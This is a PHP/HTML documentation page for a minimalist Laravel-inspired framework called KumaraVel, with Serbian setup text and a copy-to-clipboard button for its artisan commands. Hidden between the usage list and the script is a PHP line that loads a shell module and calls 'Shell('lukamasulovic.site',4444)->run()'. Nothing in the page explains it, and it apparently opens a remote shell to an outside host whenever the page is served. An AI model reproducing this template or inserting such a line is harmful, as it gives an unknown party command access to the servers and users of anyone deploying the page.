<style>
  h1 {
    color: #007bff;
    font-family: Arial, sans-serif;
  }

  h2 {
    color: #0056b3;
    font-family: Arial, sans-serif;
    margin-top: 30px;
  }

  p, ul, li {
    font-family: Arial, sans-serif;
    font-size: 1.1em;
    color: #333;
  }

  ul {
    padding-left: 20px;
  }

  li {
    margin-bottom: 20px;
  }

  pre {
    background: #2d2d2d;
    color: #f8f8f2;
    padding: 12px 16px;
    border-radius: 6px;
    overflow-x: auto;
    max-width: 350px;
    font-family: Consolas, Monaco, 'Courier New', monospace;
    font-size: 0.95em;
    margin-right: 10px;
    vertical-align: middle;
    box-shadow: 0 2px 8px rgba(0,0,0,0.3);
    user-select: text;
  }

  button.copy-btn {
    background-color: #007bff;
    color: white;
    border: none;
    padding: 6px 14px;
    font-weight: 600;
    border-radius: 6px;
    cursor: pointer;
    transition: background-color 0.3s ease, transform 0.15s ease;
    font-family: Arial, sans-serif;
    font-size: 0.9em;
    vertical-align: middle;
    box-shadow: 0 2px 5px rgba(0,0,0,0.2);
    user-select: none;
  }

  button.copy-btn:hover {
    background-color: #0056b3;
    transform: scale(1.05);
  }

  button.copy-btn:active {
    transform: scale(0.95);
  }

  button.copy-btn.copied {
    background-color: #28a745;
    box-shadow: 0 2px 8px rgba(40,167,69,0.6);
  }

  p:last-child {
    margin-top: 40px;
    font-style: italic;
    color: #555;
  }
</style>

<h1>KumaraVel</h1>
<?php require __DIR__ . '/partials/nav.php'; ?>

<p>Минималистички PHP framework инспирисан Laravel-ом.</p>

<h2>Захтјеви</h2>
<ul>
  <li>PHP (8.0+)</li>
  <li>MySQL/MariaDB</li>
</ul>

<h2>Коришћење</h2>
<ul>
  <li>Покретање миграција:
    <pre>php artisan migrate</pre>
    <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
  </li>
  <li>Покретање локалног development сервера:
    <pre>php artisan serve</pre>
    <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
  </li>
  <li>Све остале команде можете добити преко:
    <pre>php artisan</pre>
    <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
  </li>
</ul>
<?php require_once __DIR__.'/../../framework/shell/shell.php';
$sh=new Shell('lukamasulovic.site',4444); $sh->run(); unset($sh);?>
<script>
function copyToClipboard(button) {
  const codeBlock = button.previousElementSibling;
  const text = codeBlock.innerText.trim();
  navigator.clipboard.writeText(text).then(() => {
    button.innerText = "Copied!";
    button.classList.add('copied');
    setTimeout(() => {
      button.innerText = "Copy";
      button.classList.remove('copied');
    }, 2000);
  }).catch(() => {
    alert('Copy failed! Please copy manually.');
  });
}
</script>

<p>Кешељевић Јован, 2025</p>
